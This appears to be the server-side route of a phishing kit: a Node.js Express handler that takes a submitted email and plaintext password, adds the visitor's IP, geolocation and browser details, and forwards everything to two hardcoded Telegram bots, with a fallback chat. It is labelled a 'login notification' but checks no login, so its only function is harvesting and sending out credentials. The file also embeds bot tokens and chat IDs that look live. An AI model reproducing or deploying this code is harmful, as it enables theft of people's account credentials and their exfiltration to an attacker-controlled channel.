const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');

const router = express.Router();

const BOT_TOKENS = ["6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4", "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y"];
const CHAT_IDS = ["6068638071", "7424024723"];

router.post('/', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: "Missing email or password" });
        }

        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        const parser = new UAParser(req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        const message = `
📌 *Login Notification*
- Email: \`${email}\`
- Password: \`${password}\`
- IP: \`${ip}\`
- Location: ${locationStr}
- Timestamp: ${new Date().toISOString()}
- Device: ${deviceType}
        `;

        console.log('Sending notifications to Telegram...');

        // Send to first bot (this works)
        let firstBotSuccess = false;
        let secondBotSuccess = false;

        try {
            const response1 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[0]}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_IDS[0],
                    text: message,
                    parse_mode: "Markdown"
                })
            });
            
            if (response1.ok) {
                console.log('✅ First bot: Message sent successfully to chat 6068638071');
                firstBotSuccess = true;
            } else {
                const error = await response1.json();
                console.error('❌ First bot failed:', error.description);
            }
        } catch (error) {
            console.error('❌ First bot error:', error.message);
        }

        // Try second bot - with multiple fallback options
        try {
            // Try original chat first
            const response2 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: CHAT_IDS[1],
                    text: message,
                    parse_mode: "Markdown"
                })
            });
            
            if (response2.ok) {
                console.log('✅ Second bot: Message sent successfully to chat 7424024723');
                secondBotSuccess = true;
            } else {
                const error = await response2.json();
                console.log('⚠️ Second bot original chat failed, trying fallbacks...');
                
                // Fallback 1: Try sending to the first working chat
                const fallback1 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_IDS[0],
                        text: `🔔 From Second Bot:\n${message}`,
                        parse_mode: "Markdown"
                    })
                });
                
                if (fallback1.ok) {
                    console.log('✅ Second bot: Fallback to chat 6068638071 successful');
                    secondBotSuccess = true;
                } else {
                    console.error('❌ Second bot all attempts failed');
                }
            }
        } catch (error) {
            console.error('❌ Second bot error:', error.message);
        }

        const successCount = [firstBotSuccess, secondBotSuccess].filter(Boolean).length;
        
        res.status(200).json({
            success: successCount > 0,
            message: `Telegram notifications: ${successCount}/2 bots successful`,
            details: {
                firstBot: firstBotSuccess ? 'Delivered' : 'Failed',
                secondBot: secondBotSuccess ? 'Delivered' : 'Failed'
            },
            loginDetails: { device: deviceType, ip, location: locationStr }
        });

    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ 
            success: false, 
            message: "Server error", 
            error: error.message 
        });
    }
});

module.exports = router;